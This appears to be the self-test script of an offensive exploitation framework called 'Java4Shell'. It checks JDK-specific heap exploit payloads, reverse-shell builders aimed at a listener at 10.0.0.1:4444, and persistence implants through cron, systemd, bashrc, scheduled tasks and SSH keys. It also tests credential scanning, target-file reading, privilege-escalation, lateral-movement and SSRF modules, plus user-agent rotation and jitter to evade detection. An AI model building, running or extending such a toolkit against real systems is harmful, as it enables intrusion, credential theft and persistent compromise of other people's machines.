import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.targets import PROFILES, list_profiles, detect_profile
from modules.fingerprint import FingerprintResult, _derive_heap_constants
from modules.heap_oracle import _derive_target_offset, HeapOracleResult
from modules.exploit_core import build_trigger_payloads
from modules.post.javableed import PATTERNS, _scan_for_credentials, LeakedCredential
from modules.post.cred_dump import EXTRA_PATTERNS, _scan_all
from modules.post.reverse_shell import _bash_tcp, _python3_socket, _nc_mkfifo, _java_raw_socket, _powershell_enc
from modules.post.persistence import (
    _cron_payload, _systemd_payload, _bashrc_payload,
    _windows_schtasks_payload, _rc_local_payload, _authorized_keys_payload,
)
from modules.post.file_read import DEFAULT_FILES
from modules.report import (
    ReportFinding, ReportMeta,
    save_markdown_report, save_junit_xml_report, scan_results_to_findings,
)

HOST = "10.0.0.1"
PORT = 4444

print("=== Java4Shell — Self-Test ===\n")

# ── Target profiles
print("--- Target profiles ---")
for k, p in PROFILES.items():
    print(f"  {k:<16} {len(p.endpoints)} endpoints  pre_auth={p.pre_auth_rce}")

# ── Payload generation per JDK
print("\n--- Payload generation ---")
for jdk, gc in [(17, "G1GC"), (21, "G1GC"), (25, "ZGC"), (27, "Shenandoah")]:
    fp = FingerprintResult(target_url="http://test", reachable=True, jdk_major=jdk, gc_type=gc)
    _derive_heap_constants(fp)
    payloads = build_trigger_payloads(fp)
    off, spray = _derive_target_offset(fp)
    print(f"  JDK {jdk} {gc:<12} payloads={len(payloads)}  offset={off}  spray={spray//1024}KB  hdr={fp.obj_header_size}B  compact={fp.compact_headers}")
    if payloads:
        sample = payloads[0]
        print(f"    sample: {sample[:60]}...")

# ── Credential pattern scan
print("\n--- Credential pattern scan ---")
test_text = (
    "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n"
    "password=supersecret123\n"
    "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTYifQ.SflKxwRJSMeKKF2QT4fw\n"
    "jdbc:postgresql://db.internal:5432/prod?user=admin&password=s3cr3tP\n"
    "-----BEGIN RSA PRIVATE KEY-----\n"
    "MIIEpAIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4PAtRXMHLSFhLQEMTx8C9uWzqXr\n"
    "-----END RSA PRIVATE KEY-----\n"
)
found = _scan_all(test_text)
print(f"  Patterns matched: {len(found)}")
for c in found:
    print(f"    [{c.cred_type}] {c.value[:80]}")

# ── Reverse shell payloads
print("\n--- Reverse shell payload builders ---")
variants = {
    "bash-tcp":   _bash_tcp(HOST, PORT),
    "python3":    _python3_socket(HOST, PORT),
    "nc-mkfifo":  _nc_mkfifo(HOST, PORT),
    "java-raw":   _java_raw_socket(HOST, PORT),
    "powershell": _powershell_enc(HOST, PORT),
}
for name, payload in variants.items():
    print(f"  [{name}] len={len(payload)}  OK")

# ── Persistence payloads
print(f"\n--- Persistence payload builders ---")
cron = _cron_payload(HOST, PORT)
sysd = _systemd_payload(HOST, PORT)
bash = _bashrc_payload(HOST, PORT)
win  = _windows_schtasks_payload(HOST, PORT)
rcl  = _rc_local_payload(HOST, PORT)
auth = _authorized_keys_payload("ssh-rsa AAAAB3NzaC1yc2EAAAA test@test")
for name in list(cron.keys()) + list(sysd.keys()) + list(bash.keys()) + list(win.keys()) + list(rcl.keys()) + list(auth.keys()):
    print(f"  [{name}] OK")

# ── File targets
print(f"\n--- File read: {len(DEFAULT_FILES)} targets configured ---")
print(f"  First 5: {DEFAULT_FILES[:5]}")

# ── Report module ──────────────────────────────────────────────────────────────
print("\n--- Report module ---")
import tempfile, pathlib
findings_test = [
    ReportFinding(
        target="http://test.local",
        surface="HTTP-Basic-Auth",
        confidence="high",
        vulnerable=True,
        payload_preview="QUFBQUFBQUFB...",
        status_code=500,
        notes=["JVM error string in response: 'sigsegv'"],
    ),
    ReportFinding(
        target="http://test.local",
        surface="SAML-SSO",
        confidence="none",
        vulnerable=False,
        status_code=200,
    ),
]
meta_test = ReportMeta(
    target="http://test.local",
    timestamp="2026-11-18 00:00:00 UTC",
    total_probes=18,
    vulnerable_count=1,
    high_count=1,
)
with tempfile.TemporaryDirectory() as td:
    md_path  = pathlib.Path(td) / "test_report.md"
    xml_path = pathlib.Path(td) / "test_report.xml"
    save_markdown_report(findings_test, str(md_path), meta_test)
    save_junit_xml_report(findings_test, str(xml_path), meta_test)
    md_size  = md_path.stat().st_size
    xml_size = xml_path.stat().st_size
    assert md_size  > 500, f"Markdown report too small: {md_size}B"
    assert xml_size > 200, f"JUnit XML report too small: {xml_size}B"
    # Validate XML structure
    import xml.etree.ElementTree as ET
    tree = ET.parse(str(xml_path))
    testsuites = tree.getroot()
    tc_count = len(list(testsuites.iter("testcase")))
    assert tc_count == len(findings_test), f"Expected {len(findings_test)} testcases, got {tc_count}"
print(f"  Markdown report: {md_size}B  OK")
print(f"  JUnit XML report: {xml_size}B  ({tc_count} testcases)  OK")

# ── Scanner imports
print("\n--- Scanner scripts ---")
import importlib.util, pathlib
for script in ["java4shell_scanner", "java4shell_mass_scan", "java4shell_exploit"]:
    path = pathlib.Path(__file__).parent / f"{script}.py"
    spec = importlib.util.spec_from_file_location(script, path)
    # Just check syntax by compiling
    src = path.read_text(encoding="utf-8")
    try:
        compile(src, str(path), "exec")
        print(f"  {script}.py  syntax OK")
    except SyntaxError as e:
        print(f"  {script}.py  SYNTAX ERROR: {e}")


# ── Session 3/4 additions ──────────────────────────────────────────────────────
print("\n--- Session 3: OOB scalar path & avx512_host_present field ---")

# avx512_host_present field present on FingerprintResult
fp_avx = FingerprintResult(target_url="http://test", reachable=True)
assert hasattr(fp_avx, "avx512_host_present"), "avx512_host_present field missing from FingerprintResult"
print(f"  avx512_host_present field: OK (default={fp_avx.avx512_host_present!r})")

# _build_scalar_payloads: should return non-empty list; each entry must be bytes/str and >=15B
from modules.exploit_core import _build_scalar_payloads
fp_sc = FingerprintResult(target_url="http://test", reachable=True, jdk_major=21, gc_type="G1GC")
_derive_heap_constants(fp_sc)
scalar_payloads = _build_scalar_payloads(fp_sc.jdk_major, fp_sc.obj_header_size)
assert len(scalar_payloads) > 0, "scalar payloads list is empty"
for p in scalar_payloads:
    assert len(p) >= 15, f"scalar payload too short: {len(p)}B"
print(f"  _build_scalar_payloads: {len(scalar_payloads)} payloads, min_len={min(len(p) for p in scalar_payloads)}B  OK")

# warmup_target importable
from modules.exploit_core import warmup_target
assert callable(warmup_target), "warmup_target is not callable"
print("  warmup_target: importable & callable  OK")

# vulnapp profile present
assert "vulnapp" in PROFILES, "'vulnapp' profile missing from PROFILES"
vp = PROFILES["vulnapp"]
assert any(e["path"] == "/api/decode" for e in vp.endpoints), "vulnapp missing /api/decode endpoint"
print(f"  vulnapp profile: {len(vp.endpoints)} endpoints  OK")

# ── Session 4: new post-ex modules ────────────────────────────────────────────
print("\n--- Session 4: new post-ex modules import & dataclass ---")

from modules.post.privesc import PrivescResult, run_privesc
from modules.post.dns_oob import DnsOobResult, run_dns_oob
from modules.post.screenshot import ScreenshotResult, run_screenshot
from modules.post.ssrf_scan import SsrfScanResult, run_ssrf_scan
from modules.post.lateral import LateralResult, run_lateral

for cls, name in [
    (PrivescResult,    "PrivescResult"),
    (DnsOobResult,     "DnsOobResult"),
    (ScreenshotResult, "ScreenshotResult"),
    (SsrfScanResult,   "SsrfScanResult"),
    (LateralResult,    "LateralResult"),
]:
    obj = cls()
    assert hasattr(obj, "success"), f"{name} missing 'success' field"
    print(f"  {name}: import OK, instantiates OK, has .success")

for fn, name in [
    (run_privesc,    "run_privesc"),
    (run_dns_oob,    "run_dns_oob"),
    (run_screenshot, "run_screenshot"),
    (run_ssrf_scan,  "run_ssrf_scan"),
    (run_lateral,    "run_lateral"),
]:
    assert callable(fn), f"{name} not callable"
    print(f"  {name}: callable  OK")

# ── CLI 11-objective coverage ─────────────────────────────────────────────────
print("\n--- CLI: all 11 objectives present ---")
import subprocess
help_out = subprocess.run(
    [__import__("sys").executable, "java4shell_exploit.py", "--help"],
    capture_output=True, text=True,
    cwd=__import__("os").path.dirname(os.path.abspath(__file__)) or ".",
).stdout
expected_objectives = ["cmd", "shell", "bleed", "persist", "filerd", "creds",
                       "privesc", "dns_oob", "screenshot", "ssrf", "lateral", "all"]
missing = [o for o in expected_objectives if o not in help_out]
assert not missing, f"Objectives missing from --help: {missing}"
print(f"  All {len(expected_objectives)} objectives present in --help  OK")

# ── http_utils: UA rotation and jitter ───────────────────────────────────────
print("\n--- http_utils: UA rotation and jitter ---")
import time as _time
from modules.http_utils import random_ua, jitter, _USER_AGENTS
assert len(_USER_AGENTS) >= 10, f"UA pool too small: {len(_USER_AGENTS)}"
print(f"  UA pool: {len(_USER_AGENTS)} entries  OK")
_ua = random_ua()
assert isinstance(_ua, str) and len(_ua) > 10, f"random_ua returned invalid string: {_ua!r}"
print(f"  random_ua(): {_ua[:60]}...  OK")
_samples = [random_ua() for _ in range(20)]
assert len(set(_samples)) > 1, "random_ua is not rotating — always returns same string"
print(f"  Rotation check ({len(set(_samples))} distinct in 20 samples)  OK")
_t0 = _time.time(); jitter(0, 0); _elapsed = _time.time() - _t0
assert _elapsed < 0.05, f"jitter(0,0) took too long: {_elapsed:.3f}s"
print(f"  jitter(0,0): no-op  OK")
_t0 = _time.time(); jitter(50, 150); _elapsed = _time.time() - _t0
assert 0.045 <= _elapsed <= 0.300, f"jitter(50,150) out of range: {_elapsed:.3f}s"
print(f"  jitter(50,150): {_elapsed*1000:.0f}ms  OK")

# ── calibrate module: imports, payload builder, leak extractor ────────────────
print("\n--- calibrate module ---")
from modules.calibrate import (
    run_calibration, print_calibration, CalibrationResult, ProbeResult,
    _build_probe_payloads, _extract_offset, _has_oob_signal, SWEEP_SIZES,
)
# SWEEP_SIZES
assert len(SWEEP_SIZES) > 0, "SWEEP_SIZES is empty"
assert all(s % 3 == 0 for s in SWEEP_SIZES), "SWEEP_SIZES contains non-multiples of 3"
print(f"  SWEEP_SIZES: {len(SWEEP_SIZES)} entries ({SWEEP_SIZES[0]}–{SWEEP_SIZES[-1]}B)  OK")

# _build_probe_payloads
_probes_12 = _build_probe_payloads(12)
assert len(_probes_12) >= 2, f"expected >=2 probe variants for size 12, got {len(_probes_12)}"
for _p, _v in _probes_12:
    assert isinstance(_p, str) and len(_p) > 0, f"empty payload for variant {_v}"
print(f"  _build_probe_payloads(12): {len(_probes_12)} variants  OK")

# _has_oob_signal
assert _has_oob_signal("decode error: wrong 4-byte ending unit"), "missed decode error signal"
assert not _has_oob_signal("{'result':'QUFB'}"), "false positive on clean response"
print(f"  _has_oob_signal: true/false cases  OK")

# _extract_offset — patterns
assert _extract_offset("byte #47 in OOB write") == 47, "byte # pattern failed"
assert _extract_offset("offset 12 out of bounds") == 12, "offset pattern failed"
assert _extract_offset("no numbers here") is None, "should return None"
print(f"  _extract_offset: byte/offset/None cases  OK")

# CalibrationResult and ProbeResult instantiate
_cr = CalibrationResult(target="http://test", confirmed_offset=47, confidence="high")
assert _cr.target == "http://test"
_pr = ProbeResult(decoded_size=48, payload="QUFB==", variant="trail")
assert _pr.decoded_size == 48
print(f"  CalibrationResult / ProbeResult: instantiate OK")

# --mode in exploit CLI help
assert "calibrate" in help_out, "--mode calibrate missing from --help"
assert "--mode" in help_out, "--mode flag missing from --help"
print(f"  --mode calibrate present in exploit --help  OK")

print("\n=== ALL CHECKS PASSED ===")

